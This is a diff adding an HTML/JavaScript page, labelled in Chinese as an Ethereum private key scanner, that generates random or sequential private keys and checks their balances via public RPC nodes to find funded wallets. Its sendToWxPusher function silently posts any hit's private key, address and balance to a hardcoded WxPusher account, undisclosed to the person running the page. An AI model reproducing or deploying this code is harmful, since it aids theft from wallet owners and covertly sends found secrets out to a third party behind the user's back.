@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ETH私钥扫描器</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@latest/dist/ethers.umd.min.js"></script>
+    <style>
+        .table-container {
+            max-height: 700px;
+            overflow-y: auto;
+            margin-bottom: 5px;
+        }
+
+        table th, table td {
+            font-size: 10px;
+            padding: 1px;
+        }
+
+        table td {
+            font-size: 12px;
+            word-wrap: break-word;
+        }
+
+        h1, h2 {
+            font-size: 2rem;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .btn-large {
+            padding: 10px 20px;
+            font-size: 15px;
+            width: 200px;
+        }
+
+        .btn-small {
+            padding: 8px 16px;
+            font-size: 14px;
+            width: 150px;
+        }
+
+        .control-container {
+            margin-bottom: 30px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container mt-5">
+        <h1>ETH私钥扫描器</h1>
+
+        <div class="row control-container">
+            <div class="col-md-4">
+                <label for="scanMode" class="form-label">扫描模式</label>
+                <select id="scanMode" class="form-select">
+                    <option value="random">随机扫描</option>
+                    <option value="sequential">顺序扫描</option>
+                </select>
+            </div>
+
+            <div class="col-md-4">
+                <label for="stopCondition" class="form-label">停止条件</label>
+                <select id="stopCondition" class="form-select">
+                    <option value="infinite">无限扫描</option>
+                    <option value="balance">有余额时停止</option>
+                </select>
+            </div>
+        </div>
+
+        <div class="text-center">
+            <button id="startScan" class="btn btn-primary btn-large">开始扫描</button>
+            <button id="stopScan" class="btn btn-danger btn-small" style="display: none;">停止扫描</button>
+        </div>
+
+        <div class="table-container mt-4">
+            <table class="table table-bordered table-hover">
+                <thead>
+                    <tr>
+                        <th>私钥</th>
+                        <th>地址</th>
+                        <th>余额 (ETH)</th>
+                    </tr>
+                </thead>
+                <tbody id="resultTable"></tbody>
+            </table>
+        </div>
+    </div>
+
+    <script type="text/javascript">
+        let stopScanFlag = false;
+        let scanInterval;
+
+        const rpcUrls = [
+            'https://ethereum-rpc.publicnode.com',
+            'https://rpc.mevblocker.io',
+            'https://rpc.flashbots.net',
+            'https://eth1.lava.build',
+            'https://eth-pokt.nodies.app',
+            'https://ethereum.blockpi.network/v1/rpc/public',
+            'https://eth.api.onfinality.io/public',
+            'https://core.gashawk.io/rpc',
+            'https://eth.blockrazor.xyz',
+            'https://rpc.eth.gateway.fm',
+            'https://eth.meowrpc.com',
+            'https://eth.drpc.org',
+            'https://mainnet.gateway.tenderly.co',
+            'https://gateway.tenderly.co/public/mainnet',
+            'https://eth.merkle.io',
+            'https://ethereum.rpc.subquery.network/public',
+            'https://rpc.flashbots.net/fast',
+            'https://rpc.mevblocker.io/fast',
+            'https://rpc.mevblocker.io/noreverts',
+            'https://eth.llamarpc.com',
+            'https://ethereum.blockpi.network/v1/rpc/public',
+            'https://eth-mainnet.public.blastapi.io',
+            'https://eth-mainnet.alchemyapi.io/v2/demo',
+            'https://1rpc.io/eth',
+            'https://0xrpc.io/eth',
+            'https://rpc.mevblocker.io/fullprivacy',
+            'https://api-ethereum-mainnet.n.dwellir.com/f34bda43-11fb-48f6-9422-0831d9e35351',
+            'https://free-eth-node.com/api/eth'
+        ];
+
+        const keyCount = 10;  // 修改为生成 10 个私钥
+        let currentSequentialKey = null;
+        let sequentialCounter = 0;
+
+        function getRandomRpcUrl() {
+            const randomIndex = Math.floor(Math.random() * rpcUrls.length);
+            return rpcUrls[randomIndex];
+        }
+
+        function createProvider(rpcUrl) {
+            return new ethers.JsonRpcProvider(rpcUrl);
+        }
+
+        function generateRandomPrivateKey() {
+            return ethers.Wallet.createRandom().privateKey;
+        }
+
+        function generateSequentialPrivateKey() {
+            if (!currentSequentialKey || sequentialCounter >= keyCount) {
+                currentSequentialKey = generateRandomPrivateKey();
+                sequentialCounter = 0;
+                document.getElementById('resultTable').innerHTML = '';
+            }
+
+            const privateKeyBigInt = BigInt(currentSequentialKey);
+            const newPrivateKeyBigInt = privateKeyBigInt + BigInt(sequentialCounter);
+            sequentialCounter++;
+            
+            let newPrivateKey = newPrivateKeyBigInt.toString(16);
+            while (newPrivateKey.length < 64) {
+                newPrivateKey = '0' + newPrivateKey;
+            }
+
+            return '0x' + newPrivateKey;
+        }
+
+        function getAddressFromPrivateKey(privateKey) {
+            try {
+                const wallet = new ethers.Wallet(privateKey);
+                return wallet.address;
+            } catch (e) {
+                console.error("无效的私钥:", privateKey);
+                return null;
+            }
+        }
+
+        async function getBalance(address) {
+            if (!address) return '无效地址';
+            
+            let attempts = 0;
+            let success = false;
+            let balance = '查询失败';
+
+            while (!success && attempts < rpcUrls.length) {
+                const rpcUrl = rpcUrls[attempts];
+                const provider = createProvider(rpcUrl);
+                try {
+                    const balanceWei = await provider.getBalance(address);
+                    if (balanceWei < 10n ** 18n) {
+                        const balanceInGwei = balanceWei / 10n ** 9n;
+                        balance = `${balanceInGwei.toString()} Gwei`;
+                    } else {
+                        const balanceInETH = balanceWei / 10n ** 18n;
+                        balance = `${balanceInETH.toString()} ETH`;
+                    }
+                    success = true;
+                } catch (error) {
+                    attempts++;
+                }
+            }
+
+            return balance;
+        }
+
+        function sendToWxPusher(privateKey, address, balance) {
+            const APP_TOKEN = "AT_eBVzfMwOQIbii2XVrjG4GnYenmkgDgR5";
+            const UIDS = ["UID_a74XG9KK8OMBcMxRbm3uodWXf7nq"];
+            const message = `私钥: ${privateKey}\n地址: ${address}\n余额: ${balance}`;
+
+            const payload = {
+                appToken: APP_TOKEN,
+                content: message,
+                uids: UIDS,
+            };
+
+            fetch('https://wxpusher.zjiecode.com/api/send/message', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("发送成功:", data);
+            })
+            .catch(error => {
+                console.error("发送失败:", error);
+            });
+        }
+
+        async function startScan() {
+            stopScanFlag = false;
+            const resultTable = document.getElementById('resultTable');
+            const scanMode = document.getElementById('scanMode').value;
+            const stopCondition = document.getElementById('stopCondition').value;
+            let stopScan = false;
+
+            // 清空现有结果
+            if (scanMode === 'random') {
+                resultTable.innerHTML = ''; // 每次开始扫描清空结果
+            }
+
+            document.getElementById('startScan').style.display = 'none';
+            document.getElementById('stopScan').style.display = 'inline-block';
+
+            while (!stopScan && !stopScanFlag) {
+                let privateKeys = [];
+                // 如果是随机扫描模式，每次生成 10 个私钥
+                if (scanMode === 'random') {
+                    for (let i = 0; i < 10; i++) { // 修改为生成 10 个私钥
+                        privateKeys.push(generateRandomPrivateKey());
+                    }
+                } else if (scanMode === 'sequential') {
+                    // 顺序扫描时生成 10 个私钥
+                    for (let i = 0; i < 10; i++) { // 修改为生成 10 个私钥
+                        privateKeys.push(generateSequentialPrivateKey());
+                    }
+                }
+
+                resultTable.innerHTML = ''; // 清空旧的结果
+
+                for (const privateKey of privateKeys) {
+                    if (stopScanFlag) break;
+
+                    const address = getAddressFromPrivateKey(privateKey);
+                    if (!address) continue;
+
+                    try {
+                        const balance = await getBalance(address);
+                        const row = document.createElement('tr');
+                        row.innerHTML = `
+                            <td>${privateKey}</td>
+                            <td><a href="https://etherscan.io/address/${address}" target="_blank">${address}</a></td>
+                            <td>${balance}</td>
+                        `;
+                        resultTable.appendChild(row);
+
+                        if ((balance.includes('Gwei') && parseFloat(balance) > 0) || 
+                            (balance.includes('ETH') && parseFloat(balance) > 0)) {
+                            sendToWxPusher(privateKey, address, balance);
+                            if (stopCondition === 'balance') {
+                                stopScan = true;
+                            }
+                        }
+                    } catch (error) {
+                        console.error("查询失败，私钥:", privateKey, "地址:", address, "error:", error);
+                    }
+                }
+            }
+
+            document.getElementById('startScan').style.display = 'inline-block';
+            document.getElementById('stopScan').style.display = 'none';
+            alert('扫描完成');
+        }
+
+        function stopScanFunction() {
+            stopScanFlag = true;
+        }
+
+        document.getElementById('startScan').addEventListener('click', startScan);
+        document.getElementById('stopScan').addEventListener('click', stopScanFunction);
+
+        document.getElementById('stopCondition').addEventListener('change', function() {
+            // No need to handle scan limit anymore
+        });
+    </script>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
